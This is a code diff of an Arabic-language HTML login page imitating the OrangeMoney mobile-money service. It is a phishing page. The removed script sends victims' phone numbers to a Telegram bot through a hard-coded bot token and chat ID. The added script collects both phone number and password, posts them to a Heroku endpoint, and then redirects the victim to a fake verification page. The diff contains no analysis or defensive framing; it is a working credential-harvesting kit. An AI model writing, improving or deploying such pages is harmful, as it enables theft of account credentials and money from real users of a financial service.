@@ -60,36 +60,30 @@
         }
     </style>
     <script>
-        // إضافة التوكن الخاص ببوت تلجرام
-        const TELEGRAM_TOKEN = '7071902802:AAG7GZB_vh9eKatLDdsq0Q0D6AV-9Ay2HG4';
-        const CHAT_ID = '6332127387';
-
-        // وظيفة لتحويل المستخدم إلى صفحة التحقق مع تمرير رقم الهاتف
         function redirectToVerification() {
             var phoneNumber = document.getElementById("phone-input").value;
-            setTimeout(function() { // تأخير التحويل لإظهار الاستجابة
-                window.location.href = 'verification.html?phone=' + encodeURIComponent(phoneNumber);
-                sendTelegramMessage(`رقم الهاتف المستخدم لتسجيل الدخول هو: ${phoneNumber}`); // إرسال الرسالة إلى تلجرام
-            }, 500); // التأخير 0.5 ثانية قبل التحويل
-        }
+            var password = document.getElementById("password-input").value;
 
-        // وظيفة لإرسال رسالة إلى تلجرام
-        function sendTelegramMessage(message) {
-            var url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Message sent to Telegram:', data);
-                })
-                .catch(error => {
-                    console.error('Error sending message to Telegram:', error);
-                });
+            fetch('https://your-app-name.herokuapp.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phoneNumber: phoneNumber, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                setTimeout(function() {
+                    window.location.href = 'verification.html?phone=' + encodeURIComponent(phoneNumber);
+                }, 500);
+            })
+            .catch(error => console.error('Error:', error));
         }
     </script>
 </head>
 <body>
     <div class="container">
-        <img src="file-RQ4PiQTnG97TtnMlaTOMk1Th.jpg" alt="صورة مقدمة الصفحة" style="width: 100%; border-radius: 10px;">
+        <img src="images/file-RQ4PiQTnG97TtnMlaTOMk1Th.jpg" alt="صورة مقدمة الصفحة" style="width: 100%; border-radius: 10px;">
         <h1 class="title">تسجيل الدخول الى حسابي</h1> <!--## العنوان باللون الأسود وعلى اليمين-->
         <h2 class="subtitle">OrangeMoney</h2> <!--## العنوان الفرعي باللون البرتقالي وعلى اليسار-->
         
@@ -100,7 +94,7 @@
         <div style="margin: 20px 0;"></div> <!--## مسافة بين رقم الهاتف وكلمة المرور-->
 
         <label class="right-align">يرجى ادخال كلمة سر</label> <!--## محاذاة النص إلى أقصى اليمين-->
-        <input type="password" placeholder="أدخل كلمة السر" required>
+        <input id="password-input" type="password" placeholder="أدخل كلمة السر" required>
         <small class="right-align">كتابة حروف ورموز وأرقام</small>
         <br>
 
@@ -111,6 +105,6 @@
         <button onclick="redirectToVerification()">تسجيل الدخول</button> <!--## زر برتقالي غامق يعيد التوجيه لصفحة التحقق-->
     </div>
 
-    <img src="file-rh2l0xh3VmXsCSQPcbJTXTPu.jpg" alt="صورة في آخر الصفحة" class="footer-image">
+    <img src="images/file-rh2l0xh3VmXsCSQPcbJTXTPu.jpg" alt="orangemoney.all" class="footer-image">
 </body>
 </html>
